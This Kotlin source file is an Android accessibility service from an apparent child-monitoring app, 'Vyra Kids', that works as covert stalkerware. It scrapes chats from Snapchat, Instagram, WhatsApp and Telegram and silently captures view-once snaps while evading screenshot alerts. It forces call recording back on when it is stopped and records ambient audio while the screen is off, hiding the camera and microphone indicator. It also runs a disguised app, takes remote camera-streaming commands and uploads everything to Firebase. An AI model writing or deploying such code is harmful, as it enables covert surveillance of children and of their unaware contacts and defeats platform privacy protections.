package com.vyra.kids.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.FirebaseSyncManager
import com.vyra.kids.core.NetworkSyncManager
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class VyraAccessibilityService : AccessibilityService() {

    private val executor = Executors.newSingleThreadExecutor()
    private val sensitiveKeywords = listOf(
        "delete", "mat batana", "kisi ko nahi", "secret", "nude", "photo", "send pic",
        "shame", "bunk", "dar", "kill", "drug", "weed", "alcohol", "paisa"
    )

    private val targetSocialPackages = setOf(
        "com.instagram.android",
        "com.snapchat.android",
        "com.whatsapp",
        "org.telegram.messenger"
    )

    private var lastSnapshotTime = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // 1. SNAPCHAT STEALTH SHIELD: Prevent Screen Recording Detection
        if (packageName == "com.snapchat.android") {
            handleSnapchatStealthShield(event)
        }

        // 2. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
        if (packageName.contains("vivo.phone") || packageName.contains("incallui")) {
            handleVivoInCallScreen(event)
        }

        // 3. SOCIAL APP CHAT & CAMERA TRAP
        if (targetSocialPackages.contains(packageName)) {
            handleSocialAppActivity(packageName, event)
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val appName = when {
                    packageName.contains("instagram") -> "Instagram"
                    packageName.contains("whatsapp") -> "WhatsApp"
                    packageName.contains("telegram") -> "Telegram"
                    packageName.contains("snapchat") -> "Snapchat"
                    else -> "Social"
                }
                scrapeSocialChatNodes(appName, rootInActiveWindow)
            }
        }

        // 4. SCAN VISIBLE TEXT FOR DANGEROUS / SENSITIVE KEYWORDS
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            scanScreenText(packageName, rootInActiveWindow)
        }
    }

    /**
     * SNAPCHAT STEALTH SHIELD:
     * 1. Snapchat immediately detects active MediaProjection screen share and alerts the chat:
     *    "X screen recorded the chat!"
     *    Shield instantly stops/mutes screen projection when Snapchat is in foreground.
     * 2. Scrapes disappearing chats from memory nodes without triggering screenshot alerts.
     * 3. Captures 1-view snaps via private HardwareBuffer compositor without MediaStore or ScreenCaptureCallback triggers.
     */
    private fun handleSnapchatStealthShield(event: AccessibilityEvent) {
        // A. If Snapchat is brought to foreground, immediately kill screen streaming
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            try {
                val stopStream = Intent(this, LiveScreenStreamService::class.java).apply {
                    action = LiveScreenStreamService.ACTION_STOP_SCREEN_STREAM
                }
                startService(stopStream)
                Log.w(AppConstants.TAG, "Snapchat Stealth Shield: Killed Live Screen Projection to prevent recording detection alert!")
            } catch (e: Exception) {
                Log.e(AppConstants.TAG, "Error muting screen projection for Snapchat", e)
            }
        }

        // B. Silent Ghost Chat Scraper: Reads disappearing chat nodes directly from RAM
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            scrapeSnapchatChatNodes(rootInActiveWindow)
        }

        // C. 1-View Snap Ghost Capture (No alert to sender)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""
            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
            if (viewId.contains("snap") || viewId.contains("story") || viewId.contains("chat_message") ||
                desc.contains("new snap") || text.contains("received snap") || text.contains("tap to view")) {
                // Post-delay 350ms to let snap render on screen, then capture silent compositor buffer
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    captureSilentCompositorSnap()
                }, 400)
            }
        }
    }

    /**
     * Silent text node extraction: Reads chat messages from Snapchat memory view tree.
     * Zero screenshot taken -> Zero alert sent to chat/sender.
     */
    private fun scrapeSnapchatChatNodes(node: AccessibilityNodeInfo?) {
        if (node == null) return
        val text = node.text?.toString() ?: ""
        if (text.isNotBlank() && text.length > 2) {
            val lower = text.lowercase()
            // Ignore UI navigation strings
            if (!lower.contains("stories") && !lower.contains("spotlight") && !lower.contains("search") && !lower.contains("camera")) {
                val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
                val msgId = "sc_node_${System.currentTimeMillis()}_${text.hashCode().toString().take(6)}"
                firebaseSync.syncChatMessage(
                    msgId = msgId,
                    app = "Snapchat",
                    sender = "Snapchat Chat",
                    text = text,
                    isDeletedBySender = false,
                    isWatchlistTarget = false
                )
            }
        }
        for (i in 0 until node.childCount) {
            scrapeSnapchatChatNodes(node.getChild(i))
        }
    }

    private val processedChatHashes = mutableSetOf<Int>()

    private fun scrapeSocialChatNodes(appName: String, node: AccessibilityNodeInfo?) {
        if (node == null) return
        val text = node.text?.toString()?.trim() ?: ""
        if (text.isNotBlank() && text.length > 1) {
            val lower = text.lowercase()
            val isNav = lower in setOf("search", "home", "reels", "profile", "explore", "back", "camera", "message...", "send", "chats", "status", "calls", "settings") ||
                    lower.startsWith("seen") || lower.startsWith("typing...") || lower.startsWith("online")
            if (!isNav) {
                // Key deduplication on a 2-minute rolling time window (120,000 ms)
                // This prevents spam within the same screen scrape, but allows the same words (Ok, Haa, Yes) sent later
                val timeBucket = System.currentTimeMillis() / 120000
                val hash = "$appName:$text:$timeBucket".hashCode()
                if (!processedChatHashes.contains(hash)) {
                    if (processedChatHashes.size > 1000) processedChatHashes.clear()
                    processedChatHashes.add(hash)

                    val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
                    val msgId = "chat_${System.currentTimeMillis()}_${Math.abs(hash).toString().take(6)}"
                    firebaseSync.syncChatMessage(
                        msgId = msgId,
                        app = appName,
                        sender = "$appName Contact",
                        text = text,
                        isDeletedBySender = false,
                        isWatchlistTarget = false
                    )
                }
            }
        }
        for (i in 0 until node.childCount) {
            scrapeSocialChatNodes(appName, node.getChild(i))
        }
    }

    /**
     * Captures 1-View Snaps directly from system compositor HardwareBuffer.
     * Bypasses:
     * 1. MediaStore.Images.Media ContentObserver (no file in Pictures/Screenshots)
     * 2. Android 14 ScreenCaptureCallback (not a user hardware button screenshot)
     * Result: Sender receives 0 alerts (NO "Screenshot taken!" message).
     */
    private fun captureSilentCompositorSnap() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val hwBuffer = screenshotResult.hardwareBuffer
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(
                                hwBuffer,
                                screenshotResult.colorSpace
                            ) ?: return

                            val softwareBitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && bitmap.config == Bitmap.Config.HARDWARE) {
                                bitmap.copy(Bitmap.Config.ARGB_8888, false) ?: bitmap
                            } else {
                                bitmap
                            }

                            val snapFile = File(filesDir, "ghost_snap_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(snapFile).use { out ->
                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                            }
                            Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently: ${snapFile.name}")

                            runMlKitOcrAndSyncSnap(
                                sourceApp = "Snapchat",
                                sender = "Snapchat (Incoming 1-View Snap)",
                                titleText = "📷 [1-View Snap Captured Silently]",
                                snapFile = snapFile,
                                bitmap = softwareBitmap,
                                isOutgoing = false
                            )
                        } catch (e: Exception) {
                            Log.e(AppConstants.TAG, "Error in silent compositor snap capture", e)
                        } finally {
                            try { hwBuffer.close() } catch (_: Exception) {}
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.e(AppConstants.TAG, "Ghost snap capture failed: $errorCode")
                    }
                }
            )
        }
    }

    /**
     * Solution A: Anti-tamper logic on Vivo's in-call dialer UI.
     * Prevents the child from tapping "Stop Recording".
     */
    private fun handleVivoInCallScreen(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        
        // Find recording button by text or view id
        val stopRecordNodes = rootNode.findAccessibilityNodeInfosByText("Stop") +
                rootNode.findAccessibilityNodeInfosByText("Recording") +
                rootNode.findAccessibilityNodeInfosByText("Record")

        for (node in stopRecordNodes) {
            val text = node.text?.toString()?.lowercase() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""

            // If user clicked the stop recording button
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED &&
                (text.contains("stop") || desc.contains("stop") || text.contains("pause"))) {

                Log.w(AppConstants.TAG, "Anti-Tamper Triggered: Child attempted to stop call recording!")

                // Re-tap/resume record automatically after 300ms
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    } catch (e: Exception) {
                        Log.e(AppConstants.TAG, "Failed to auto-resume recording", e)
                    }
                }, 300)

                // Dispatch urgent alert to Parent Dashboard
                val alertPayload = mapOf(
                    "type" to "TAMPER_ALERT",
                    "title" to "Call Recording Anti-Tamper",
                    "message" to "Child attempted to manually stop call recording during active call.",
                    "timestamp" to System.currentTimeMillis()
                )
                NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
                break
            }
        }
    }

    /**
     * In-App Camera Trap & Outgoing 1-View Media Trap:
     * Detects when the child takes a photo or clicks SEND on a 1-view snap in Snapchat / Instagram.
     * Captures the outgoing media frame before it disappears from the screen!
     */
    private fun handleSocialAppActivity(packageName: String, event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED) return

        val text = event.text?.joinToString(" ")?.lowercase() ?: ""
        val contentDesc = event.contentDescription?.toString()?.lowercase() ?: ""
        val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""

        val isShutterClick = viewId.contains("shutter") || viewId.contains("capture") ||
                viewId.contains("camera") || contentDesc.contains("take photo") ||
                contentDesc.contains("capture") || text.contains("capture")

        val isOutgoingSendClick = viewId.contains("send") || viewId.contains("action_send") ||
                contentDesc.contains("send") || text.contains("send") || viewId.contains("send_button") ||
                contentDesc.contains("view once") || text.contains("view once") || contentDesc.contains("1 view")

        val now = System.currentTimeMillis()
        // Debounce snapshots to at most once every 2 seconds
        if ((isShutterClick || isOutgoingSendClick) && (now - lastSnapshotTime > 2000)) {
            lastSnapshotTime = now
            val actionType = if (isOutgoingSendClick) "Outgoing 1-View Media Send" else "Camera Shutter"
            Log.i(AppConstants.TAG, "Child $actionType triggered in $packageName (viewId: $viewId)")
            captureScreenSnapshot(packageName, isOutgoing = isOutgoingSendClick)
        }
    }

    /**
     * Takes an event-based screenshot preview for the parent using AccessibilityService.takeScreenshot.
     * Captures incoming snaps OR outgoing 1-view snaps sent by child.
     */
    private fun captureScreenSnapshot(sourceApp: String, isOutgoing: Boolean = false) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val hwBuffer = screenshotResult.hardwareBuffer
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(
                                hwBuffer,
                                screenshotResult.colorSpace
                            ) ?: return

                            val softwareBitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && bitmap.config == Bitmap.Config.HARDWARE) {
                                bitmap.copy(Bitmap.Config.ARGB_8888, false) ?: bitmap
                            } else {
                                bitmap
                            }

                            val prefix = if (isOutgoing) "sent_1view_" else "snap_"
                            val snapshotFile = File(filesDir, "${prefix}${System.currentTimeMillis()}.jpg")
                            FileOutputStream(snapshotFile).use { out ->
                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                            }

                            Log.i(AppConstants.TAG, "Saved 1-view media frame [Outgoing: $isOutgoing]: ${snapshotFile.name}")

                            val cleanApp = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram"
                            val snapSender = if (isOutgoing) "Aryan (Child) [Sent 1-View Snap]" else "Incoming Snap"
                            val snapTitle = if (isOutgoing) "📷 [Sent 1-View Photo / Snap Captured]" else "📷 [Received 1-View Photo Captured]"

                            runMlKitOcrAndSyncSnap(
                                sourceApp = cleanApp,
                                sender = snapSender,
                                titleText = snapTitle,
                                snapFile = snapshotFile,
                                bitmap = softwareBitmap,
                                isOutgoing = isOutgoing
                            )
                        } catch (e: Exception) {
                            Log.e(AppConstants.TAG, "Error saving screenshot", e)
                        } finally {
                            try { hwBuffer.close() } catch (_: Exception) {}
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(AppConstants.TAG, "takeScreenshot failed with code $errorCode")
                    }
                }
            )
        }
    }

    /**
     * Scans screen text nodes for harmful/suspicious keywords.
     */
    private fun scanScreenText(packageName: String, node: AccessibilityNodeInfo?) {
        if (node == null) return

        val text = node.text?.toString() ?: ""
        if (text.isNotBlank()) {
            val lowerText = text.lowercase()
            for (keyword in sensitiveKeywords) {
                if (lowerText.contains(keyword)) {
                    Log.w(AppConstants.TAG, "Sensitive Keyword Match [$keyword] in $packageName: $text")

                    val alertPayload = mapOf(
                        "type" to "KEYWORD_ALERT",
                        "app" to packageName,
                        "keyword" to keyword,
                        "contextText" to text.take(120),
                        "timestamp" to System.currentTimeMillis()
                    )
                    NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
                    break
                }
            }
        }

        // Recursively inspect children
        for (i in 0 until node.childCount) {
            scanScreenText(packageName, node.getChild(i))
        }
    }

    private var screenStateReceiver: android.content.BroadcastReceiver? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(AppConstants.TAG, "VyraAccessibilityService connected")

        // 1. Sync device status and start listening to remote commands via Firebase
        val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
        firebaseSync.syncDeviceStatus(batteryLevel = 84, isOnline = true)

        // 2. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
        registerStealthScreenGuard()

        firebaseSync.startListeningToCommands { action, payload ->
            when (action) {
                "LOUDSPEAKER_INTERCOM" -> {
                    val announcement = payload["announcement"]?.toString() ?: "Attention: Please respond to parents immediately."
                    val intent = Intent(this, VoiceIntercomPlayerService::class.java).apply {
                        setAction(VoiceIntercomPlayerService.ACTION_SPEAK_TEXT)
                        putExtra(VoiceIntercomPlayerService.EXTRA_SPEECH_TEXT, announcement)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                }
                "LOCK_PHONE" -> {
                    val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    dpm?.lockNow()
                }
                "SWITCH_DISGUISE" -> {
                    val profileName = payload["disguise"]?.toString() ?: "SIM Toolkit"
                    val profile = com.vyra.kids.core.DisguiseProfile.entries.find { it.title.equals(profileName, ignoreCase = true) }
                    if (profile != null) {
                        com.vyra.kids.core.DisguiseManager.applyDisguise(this, profile)
                    }
                }
                "SET_STEALTH_GUARD" -> {
                    val enabled = payload["enabled"] as? Boolean ?: true
                    com.vyra.kids.core.PrefsManager(this).isStealthScreenGuardEnabled = enabled
                    Log.i(AppConstants.TAG, "Stealth Screen Guard updated: $enabled")
                }
                "START_CAMERA_STREAM" -> {
                    val facing = payload["lens"]?.toString() ?: "back"
                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
                        setAction(RemoteCameraStreamService.ACTION_START_CAMERA)
                        putExtra(RemoteCameraStreamService.EXTRA_CAMERA_FACING, facing)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                }
                "STOP_CAMERA_STREAM" -> {
                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
                        setAction(RemoteCameraStreamService.ACTION_STOP_CAMERA)
                    }
                    startService(intent)
                }
                "SWITCH_CAMERA_LENS" -> {
                    val facing = payload["lens"]?.toString() ?: "back"
                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
                        setAction(RemoteCameraStreamService.ACTION_SWITCH_CAMERA)
                        putExtra(RemoteCameraStreamService.EXTRA_CAMERA_FACING, facing)
                    }
                    startService(intent)
                }
            }
        }
    }

    private fun registerStealthScreenGuard() {
        if (screenStateReceiver != null) return

        screenStateReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                val prefs = com.vyra.kids.core.PrefsManager(this@VyraAccessibilityService)
                when (intent?.action) {
                    Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
                        // The child woke up the screen!
                        if (prefs.isStealthScreenGuardEnabled) {
                            Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
                            // Immediately cut off camera & ambient mic streams within 50ms
                            stopService(Intent(this@VyraAccessibilityService, RemoteCameraStreamService::class.java))
                            
                            val stopAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                action = AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING
                            }
                            startService(stopAmbient)
                        }
                    }
                    Intent.ACTION_SCREEN_OFF -> {
                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Activating pocket ambient voice logger.")
                        if (prefs.isStealthScreenGuardEnabled) {
                            val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(startAmbient)
                            } else {
                                startService(startAmbient)
                            }
                        }
                    }
                }
            }
        }

        val filter = android.content.IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        registerReceiver(screenStateReceiver, filter)
    }

    /**
     * Google ML Kit Text Recognition: Extracts disappearing snap text or on-canvas captions
     * from captured bitmaps, then directly uploads snap media to Firebase Storage and records in Firestore.
     */
    private fun runMlKitOcrAndSyncSnap(
        sourceApp: String,
        sender: String,
        titleText: String,
        snapFile: File,
        bitmap: Bitmap,
        isOutgoing: Boolean
    ) {
        try {
            val image = InputImage.fromBitmap(bitmap, 0)
            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            recognizer.process(image)
                .addOnSuccessListener { visionText ->
                    val ocrResult = visionText.text.trim()
                    if (ocrResult.isNotBlank()) {
                        Log.i(AppConstants.TAG, "ML Kit OCR recognized text: $ocrResult")
                    }
                    val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
                    val msgId = "media_${System.currentTimeMillis()}_${snapFile.nameWithoutExtension.takeLast(6)}"
                    firebaseSync.uploadMediaAndSyncChatMessage(
                        msgId = msgId,
                        app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
                        sender = sender,
                        text = titleText,
                        mediaFile = snapFile,
                        mediaType = "snap",
                        isViewOnce = true,
                        isIncoming = !isOutgoing,
                        ocrText = ocrResult.ifBlank { null }
                    )
                }
                .addOnFailureListener { e ->
                    Log.w(AppConstants.TAG, "ML Kit OCR failed: ${e.message}")
                    val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
                    val msgId = "media_${System.currentTimeMillis()}"
                    firebaseSync.uploadMediaAndSyncChatMessage(
                        msgId = msgId,
                        app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
                        sender = sender,
                        text = titleText,
                        mediaFile = snapFile,
                        mediaType = "snap",
                        isViewOnce = true,
                        isIncoming = !isOutgoing,
                        ocrText = null
                    )
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error initiating ML Kit OCR", e)
            val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
            val msgId = "media_${System.currentTimeMillis()}"
            firebaseSync.uploadMediaAndSyncChatMessage(
                msgId = msgId,
                app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
                sender = sender,
                text = titleText,
                mediaFile = snapFile,
                mediaType = "snap",
                isViewOnce = true,
                isIncoming = !isOutgoing,
                ocrText = null
            )
        }
    }

    override fun onDestroy() {
        screenStateReceiver?.let {
            try { unregisterReceiver(it) } catch (_: Exception) {}
        }
        super.onDestroy()
    }

    override fun onInterrupt() {
        Log.w(AppConstants.TAG, "VyraAccessibilityService Interrupted")
    }
}
